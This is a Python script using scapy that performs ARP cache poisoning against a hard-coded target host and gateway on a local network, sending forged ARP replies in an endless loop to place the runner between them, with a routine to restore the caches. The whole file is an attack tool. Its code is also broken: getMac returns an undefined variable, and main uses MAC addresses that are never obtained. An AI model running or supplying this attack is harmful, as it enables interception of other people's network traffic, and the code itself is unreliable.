from scapy.all import *

INTERFACE = "en0"
GATEWAY_IP = "192.168.1.2"
TARGET_IP = "192.168.1.103"
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
PKT_COUNT = 50


def getMac(IP):
    """
    Get mac address from the IP provided
    """
    ans, unans = srp(Ether(dst=BROADCAST_MAC)/ARP(pdst=IP),
                     timeout=2, iface=INTERFACE, inter=0.1)
    for send, recive in ans:
        return r[Ether].src
    return None


def getTargetInfo():
    """
    Gets MAC address of target and gateway
    """
    try:
        gateway_mac = getMac(GATEWAY_IP)
        print("Gateway MAC :" + gateway_mac)
    except:
        print("Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    try:
        target_mac = getMac(TARGET_IP)
        print("Target MAC :" + target_mac)
    except:
        print("Failed to get target MAC. Exiting.")
        sys.exit(0)


def poison(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac):
    """
    Start actual poisoning
    """
    targetPacket = ARP()
    targetPacket.op = 2
    targetPacket.psrc = GATEWAY_IP
    targetPacket.pdst = TARGET_IP
    targetPacket.hwdst = target_mac
    gatewayPacket = ARP()
    gatewayPacket.op = 2
    gatewayPacket.psrc = TARGET_IP
    gatewayPacket.pdst = GATEWAY_IP
    gatewayPacket.hwdst = gateway_mac
    while True:
        try:
            targetPacket.show()
            send(targetPacket)
            gatewayPacket.show()
            send(gatewayPacket)
            time.sleep(2)
        except KeyboardInterrupt:
            restore(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)


def restore(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac):
    """ 
    Restore poisoned cache
    """
    print("Restoring target...")
    send(ARP(op=2, psrc=GATEWAY_IP,
             pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=100)
    send(ARP(op=2, psrc=TARGET_IP,
             pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=100)
    print("[Target Restored...")
    sys.exit(0)


def main():
    try:
        poison(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
    except KeyboardInterrupt:
        restore(GATEWAY_IP, gateway_mac, TARGET_IP, target_mac)
        return


if __name__ == '__main__':
    main()
